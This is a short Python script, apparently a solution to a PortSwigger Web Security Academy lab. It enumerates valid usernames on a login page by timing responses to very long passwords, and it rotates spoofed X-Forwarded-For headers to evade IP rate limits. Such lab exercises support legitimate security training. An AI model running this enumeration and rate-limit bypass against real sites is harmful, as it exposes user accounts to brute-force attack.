import random
import requests
import time

burp0_url = "https://0a8700ea04ee977b8168d073003d0076.web-security-academy.net:443/login"
burp0_headers = {"Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": "8.8.8.9"}
burp0_data = {"username": "wiener", "password": "password"}

LONG_PASSWORD = "ABC" * 500

IP_INDEX = 0
RANDOM_IPS = [f"{random.randint(20,250)}.{random.randint(20,250)}.{random.randint(20,250)}.{random.randint(20,250)}" for _ in range(100)]

def is_valid_username(username: str):
    global LONG_PASSWORD, IP_INDEX, RANDOM_IPS

    data = burp0_data.copy()
    data["password"] = LONG_PASSWORD
    data["username"] = username

    headers = burp0_headers.copy()
    headers["X-Forwarded-For"] = RANDOM_IPS[IP_INDEX]
    IP_INDEX = (IP_INDEX + 1) % len(RANDOM_IPS)

    start = time.time()
    r = requests.post(burp0_url, headers=headers, data=data)
    end = time.time()

    total_time = end - start

    if total_time >= 3:
        return True
    return False

# print(is_valid_username("wiener"))
# print(is_valid_username("wiener2"))

with open('portswigger-wordlists/usernames', 'r') as file:
    for line in file:
        line = line.strip()
        
        if is_valid_username(line):
            print(f"Found username: {line}")
